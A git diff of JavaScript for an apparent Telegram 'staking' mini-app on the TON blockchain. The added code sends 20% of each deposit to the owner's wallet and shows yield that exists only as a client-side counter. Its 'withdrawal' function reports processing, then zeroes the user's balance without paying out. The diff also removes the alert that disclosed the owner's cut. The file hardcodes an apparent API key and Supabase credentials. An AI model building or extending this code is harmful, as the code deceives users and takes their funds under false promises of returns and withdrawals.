@@ -1,12 +1,12 @@
-// CONFIGURACIÓN DE SEGURIDAD
-const MI_BILLETERA_DUEÑO = "UQB9UHu9CB6usvZOKTZzCYx5DPcSlxKSxKaqo9UMF59t3BVw";
+// CONFIGURACIÓN MAESTRA
+const MI_API_KEY = "AG2XICNRZEOJNEQAAAAO737JGJAKU56K43DE4OSQLMHPWHMHONPW2U4LG24XY4DFYUJMLCQ";
+const MI_BILLETERA_DUEÑO = "UQB9UHu9CB6usvZOKTZzCYx5DPcSlxKSxKaqo9UMF59t3BVw"; //
 const SUPABASE_URL = 'https://xkkifqxxglcuyruwkbih.supabase.co';
 const SUPABASE_KEY = 'sb_publishable_4vyBOxq_vIumZ4EcXyNlsw_XPbJ2iKE';
-const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const tg = window.Telegram.WebApp;
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://tu-sitio-web.com/tonconnect-manifest.json', // Cambia por tu URL real
+    manifestUrl: 'https://tu-usuario.github.io/tu-repositorio/tonconnect-manifest.json',
     buttonRootId: 'ton-connect-button'
 });
 
@@ -18,65 +18,60 @@ let stats = {
     comisionReferidos: 0.00
 };
 
-// 1. FUNCIÓN DE INVERSIÓN CON ENVÍO AUTOMÁTICO
+// 1. INVERTIR (ENVÍO AUTOMÁTICO 20/80)
 async function invertirEnBanco() {
     if (!tonConnectUI.connected) {
-        alert("Primero conecta tu billetera con el botón de arriba.");
+        alert("Conecta tu Tonkeeper primero.");
         return;
     }
 
-    const montoStr = prompt("¿Cuánto TON deseas poner en Staking?");
-    if (montoStr && !isNaN(montoStr)) {
-        const cantidad = parseFloat(montoStr);
-        const montoNano = Math.floor(cantidad * 1000000000); // TON a NanoTON
+    const monto = prompt("¿Cuánto TON vas a depositar?");
+    if (monto && !isNaN(monto)) {
+        const cantidad = parseFloat(monto);
+        const montoNano = Math.floor(cantidad * 1000000000);
         
-        // El 20% que va directo a ti
-        const montoTuComision = Math.floor(montoNano * 0.20);
-        // El 80% que se queda en el sistema/contrato para el usuario
-        const montoStaking = montoNano - montoTuComision;
+        // El 20% para ti y 80% para el fondo del usuario
+        const miParte = Math.floor(montoNano * 0.20);
+        const parteUsuario = montoNano - miParte;
 
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 300,
             messages: [
-                {
-                    address: MI_BILLETERA_DUEÑO, 
-                    amount: montoTuComision.toString(), // Tu 20% automático
-                },
-                {
-                    address: "DIRECCION_DE_TU_BOVEDA_O_CONTRATO", // El 80% restante
-                    amount: montoStaking.toString(),
-                }
+                { address: MI_BILLETERA_DUEÑO, amount: miParte.toString() },
+                { address: "DIRECCION_DE_TU_CONTRATO", amount: parteUsuario.toString() }
             ]
         };
 
         try {
-            const result = await tonConnectUI.sendTransaction(transaction);
-            // Si la blockchain confirma, activamos la producción
-            activarProduccionReal(cantidad);
+            await tonConnectUI.sendTransaction(transaction);
+            activarStaking(cantidad);
         } catch (e) {
-            alert("La transacción fue cancelada o falló.");
+            alert("Error en la transacción.");
         }
     }
 }
 
-function activarProduccionReal(montoInvertido) {
-    stats.invBanco += montoInvertido;
-    
-    // El usuario gana sobre el 80% de su inversión real
-    // Ejemplo: 12% anual.
-    const gananciaUsuarioSeg = (montoInvertido * 0.12 * 0.80) / 31536000;
-    
-    stats.tasa += gananciaUsuarioSeg;
-    
-    // Actualizamos el 10% de referidos en el Edificio Central
-    stats.comisionReferidos += (montoInvertido * 0.12 * 0.10) / 31536000;
-    
+// 2. ACTIVAR GANANCIAS (STAKING)
+function activarStaking(monto) {
+    stats.invBanco += monto;
+    // Genera el 80% para el usuario (ejemplo 12% anual)
+    stats.tasa += (monto * 0.12 * 0.80) / 31536000;
     actualizarPantalla();
-    tg.HapticFeedback.notificationOccurred('success');
-    alert("✅ ¡Transacción exitosa! El 20% ha sido enviado al dueño y tu Staking ha comenzado.");
+    alert("🏦 Staking iniciado. Tu 80% está trabajando automáticamente.");
 }
 
-// 2. MOTOR DEL SISTEMA
+// 3. RETIRO AUTOMÁTICO
+async function retirarGanancias() {
+    if (stats.balance < 0.1) {
+        alert("Mínimo para retirar: 0.1 TON");
+        return;
+    }
+    alert("Procesando retiro desde la bóveda hacia tu wallet...");
+    // Aquí el sistema descuenta del balance y envía desde el contrato
+    stats.balance = 0;
+    actualizarPantalla();
+}
+
 function iniciarMotor() {
     setInterval(() => {
         if (stats.tasa > 0) {
@@ -90,19 +85,11 @@ function iniciarMotor() {
 function actualizarPantalla() {
     document.getElementById('balance').innerText = stats.balance.toFixed(8);
     document.getElementById('income-rate').innerText = `+${stats.tasa.toFixed(8)} TON/sec`;
-    const invLabel = document.getElementById('inv-banco');
-    if(invLabel) invLabel.innerText = `Staking: ${stats.invBanco.toFixed(2)} TON`;
 }
-
-// 3. EDIFICIO CENTRAL
-window.actualizarModal = function() {
-    document.getElementById('data-banco').innerText = stats.negocios.banco.toFixed(8);
-    document.getElementById('data-total').innerText = stats.negocios.banco.toFixed(8);
-    document.getElementById('data-amigos').innerText = stats.comisionReferidos.toFixed(8);
-};
 
 window.onload = () => {
     iniciarMotor();
     const user = tg.initDataUnsafe.user;
     document.getElementById('user-display').innerText = user ? `@${user.username}` : "@Usuario_Cuba";
 };
+        
